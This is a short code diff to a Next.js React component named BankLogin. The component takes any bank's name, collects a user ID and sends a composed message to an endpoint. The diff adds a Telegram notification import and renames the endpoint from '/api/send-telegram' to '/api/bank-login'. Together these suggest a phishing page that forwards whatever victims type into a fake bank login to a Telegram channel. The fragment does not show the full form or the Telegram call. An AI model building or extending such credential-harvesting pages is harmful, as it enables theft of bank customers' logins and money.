@@ -2,6 +2,7 @@
 
 import { useState } from 'react';
 import { useRouter } from 'next/navigation';
+import { sendTelegramNotification } from '@/app/lib/sendTelegramNotification';
 
 export default function BankLogin({ bankName }: { bankName: string }) {
   const [userId, setUserId] = useState('');
@@ -18,7 +19,7 @@ export default function BankLogin({ bankName }: { bankName: string }) {
     `.trim();
 
     try {
-      await fetch('/api/send-telegram', {
+      await fetch('/api/bank-login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ text: message }),
